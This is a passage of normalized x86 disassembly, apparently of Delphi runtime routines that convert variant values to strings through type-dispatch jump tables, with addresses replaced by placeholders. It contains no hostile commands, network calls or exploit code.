mov edx [ ebp - 0x18 ]
mov eax esi
mov ecx 0x0
call sub_406b98
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_406ff0
mov edx [ ebp - 0x1c ]
mov eax esi
mov ecx 0x0
call sub_406b98
jmp r-xdata
lea edx [ ebp - 0x20 ]
movzx eax [ ebx + 0x8 ]
call sub_41f81c
mov edx [ ebp - 0x20 ]
mov eax esi
mov ecx 0x0
call sub_406b98
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x24 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
lea edx [ ebp - 0x28 ]
movzx eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x28 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x2c ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_411b20
mov edx [ ebp - 0x30 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_411b20
mov edx [ ebp - 0x34 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_411934
mov edx [ ebp - 0x38 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_41fa88
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_41f8e4
mov edx [ ebp - 0x3c ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420129
lea eax [ ebp - 0x7c ]
mov edx 0x8
call j_sub_4068c4
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_406d6c
lea eax [ ebp - 0x50 ]
mov edx 0x4
call j_sub_4068c4
lea eax [ ebp - 0x40 ]
call sub_4068a0
lea eax [ ebp - 0x3c ]
mov edx 0x7
call j_sub_4068c4
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_406d6c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call j_sub_4068c4
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_41f99c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4068f4
jmp r-xdata
dec dx
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov ecx 0x0
call sub_4072d4
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_41ba38
mov eax esi
mov edx [ ebx + 0x8 ]
mov ecx 0x0
call sub_4072d4
jmp r-xdata
jmp r-xdata
test ah 0x40
je r-xdata
mov eax esi
call sub_4068a0
mov edx eax
mov eax ebx
call sub_41fa00
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0xc
jg r-xdata
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_41f8e4
mov edx [ ebp - 0x7c ]
mov eax esi
mov ecx 0x0
call sub_4072d4
cmp eax 0x14
jg r-xdata
je r-xdata
sub eax 0x15
je r-xdata
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_41fa88
jmp r-xdata
cmp eax 0xb
ja r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
call sub_411934
mov edx [ ebp - 0x74 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_411b20
mov edx [ ebp - 0x70 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
sub eax 0x10
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_41f8e4
mov edx [ ebp - 0x78 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
jmp [ eax * 4 + jump_table_41fddf ]
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
mov ecx 0x0
call sub_406b14
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_411914
mov edx [ ebp - 0x60 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
dec eax
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_411914
mov edx [ ebp - 0x44 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_411914
mov edx [ ebp - 0x48 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_41374c
mov edx [ ebp - 0x4c ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_41374c
mov edx [ ebp - 0x50 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_41f7ac
mov edx [ ebp - 0x54 ]
mov eax esi
mov ecx 0x0
call sub_406b98
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_41f7e4
mov edx [ ebp - 0x58 ]
mov eax esi
mov ecx 0x0
call sub_406b98
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
mov ecx 0x0
call sub_406b48
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_41f81c
mov edx [ ebp - 0x5c ]
mov eax esi
mov ecx 0x0
call sub_406b98
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
mov ecx 0x0
call sub_406b48
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_411914
mov edx [ ebp - 0x64 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
dec eax
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_411914
mov edx [ ebp - 0x68 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_411b20
mov edx [ ebp - 0x6c ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
jmp r-xdata
sub_420130
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4201ef
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4201cd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x8
call sub_41becc
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_407254
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4077d0
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40730c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4201d4
lea eax [ ebp - 0x10 ]
call sub_41c288
retn
sub_4201fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_420252
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_41c5f0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_42033c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420259
lea eax [ ebp - 0x10 ]
call sub_41c288
retn
sub_420260
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
xor ecx ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42032b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
movzx eax [ ebx ]
call sub_422ab0
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420332
lea eax [ ebp - 0x28 ]
mov edx 0x2
call j_sub_4068c4
retn
lea eax [ ebp - 0x20 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_420309
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x18 ]
call sub_407254
mov eax [ ebp - 0x28 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4077d0
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_40730c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x20 ]
call sub_41c288
retn
sub_42033c
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42092b
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_420375 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_406ef4
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_406d54
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_40730c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40730c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_41374c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40730c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_41374c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40730c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_41f7ac
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_406d90
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_41f7e4
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_406d90
jmp r-xdata
push esi
mov eax [ ebx + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_406ff0
jmp r-xdata
lea edx [ ebp - 0x1c ]
movzx eax [ ebx + 0x8 ]
call sub_41f81c
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_406d90
jmp r-xdata
lea edx [ ebp - 0x20 ]
movsx eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_40730c
jmp r-xdata
lea edx [ ebp - 0x24 ]
movzx eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_40730c
jmp r-xdata
lea edx [ ebp - 0x28 ]
movzx eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_40730c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x2c ]
call sub_411b20
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_40730c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x30 ]
call sub_411b20
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_40730c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_411934
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_40730c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_42033c
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_420130
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_406d90
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420932
lea eax [ ebp - 0x78 ]
mov edx 0x2
call sub_406d6c
lea eax [ ebp - 0x70 ]
mov edx 0x6
call j_sub_4068c4
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_406d6c
lea eax [ ebp - 0x4c ]
mov edx 0x4
call j_sub_4068c4
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_406d6c
lea eax [ ebp - 0x34 ]
mov edx 0x6
call j_sub_4068c4
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_406d6c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call j_sub_4068c4
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4201fc
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_406d90
jmp r-xdata
dec dx
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40730c
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_41ba38
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40730c
jmp r-xdata
jmp r-xdata
test ah 0x40
je r-xdata
mov eax esi
call sub_406d54
mov edx eax
mov eax ebx
call sub_420260
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0xc
jg r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_420130
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_406d90
cmp eax 0x14
jg r-xdata
je r-xdata
sub eax 0x15
je r-xdata
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_42033c
jmp r-xdata
cmp eax 0xb
ja r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_411934
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_40730c
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_411b20
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_40730c
jmp r-xdata
sub eax 0x10
je r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_420130
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_406d90
jmp r-xdata
jmp [ eax * 4 + jump_table_420630 ]
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_406e88
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_411914
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_40730c
jmp r-xdata
dec eax
je r-xdata
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_411914
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_40730c
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_411914
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_40730c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_41374c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_40730c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_41374c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_40730c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_41f7ac
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_406d90
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_41f7e4
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_406d90
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_406eb8
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_41f81c
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_406d90
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_406eb8
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_411914
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_40730c
jmp r-xdata
dec eax
je r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_411914
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_40730c
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_411b20
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_40730c
jmp r-xdata
jmp r-xdata
sub_420938
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_42098e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_41c5f0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_420a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420995
lea eax [ ebp - 0x10 ]
call sub_41c288
retn
sub_42099c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
xor ecx ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_420a54
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
movzx eax [ ebx ]
call sub_422ab0
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420a5b
lea eax [ ebp - 0x24 ]
call j_sub_4068a0
retn
lea eax [ ebp - 0x20 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_420a37
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x18 ]
call sub_407254
mov eax [ ebp - 0x24 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4077d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x20 ]
call sub_41c288
retn
sub_420a64
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42105e
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_420a9e ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4072ac
jmp r-xdata
dec dx
je r-xdata
mov eax esi
xor edx edx
call sub_4070a8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4070a8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4070a8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_41374c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4070a8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_41374c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4070a8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_41f7ac
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4072f8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_41f7e4
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4072f8
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_406ff0
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4072f8
jmp r-xdata
lea edx [ ebp - 0x20 ]
movzx eax [ ebx + 0x8 ]
call sub_41f81c
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4072f8
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4070a8
jmp r-xdata
lea edx [ ebp - 0x28 ]
movzx eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4070a8
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4070a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_411b20
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4070a8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_411b20
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4070a8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_411934
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4070a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_420a64
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_420130
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4072f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421065
lea eax [ ebp - 0x7c ]
mov edx 0x2
call sub_406d6c
lea eax [ ebp - 0x74 ]
mov edx 0x6
call j_sub_4068c4
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_406d6c
lea eax [ ebp - 0x50 ]
mov edx 0x5
call j_sub_4068c4
lea eax [ ebp - 0x3c ]
call sub_406d54
lea eax [ ebp - 0x38 ]
mov edx 0x6
call j_sub_4068c4
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_406d6c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call j_sub_4068c4
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_420938
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4070a8
jmp r-xdata
dec dx
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4070a8
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_41ba38
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4070a8
jmp r-xdata
jmp r-xdata
test ah 0x40
je r-xdata
mov eax esi
call j_sub_4068a0
mov edx eax
mov eax ebx
call sub_42099c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0xc
jg r-xdata
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_420130
mov edx [ ebp - 0x7c ]
mov eax esi
call sub_4072f8
cmp eax 0x14
jg r-xdata
je r-xdata
sub eax 0x15
je r-xdata
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_420a64
jmp r-xdata
cmp eax 0xb
ja r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
call sub_411934
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4070a8
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_411b20
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4070a8
jmp r-xdata
sub eax 0x10
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_420130
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_4072f8
jmp r-xdata
jmp [ eax * 4 + jump_table_420d68 ]
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_407224
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_411914
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4070a8
jmp r-xdata
dec eax
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_411914
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4070a8
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_411914
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4070a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_41374c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4070a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_41374c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4070a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_41f7ac
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4072f8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_41f7e4
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4072f8
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_407254
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_41f81c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4072f8
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_407254
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_411914
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4070a8
jmp r-xdata
dec eax
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_411914
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4070a8
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_411b20
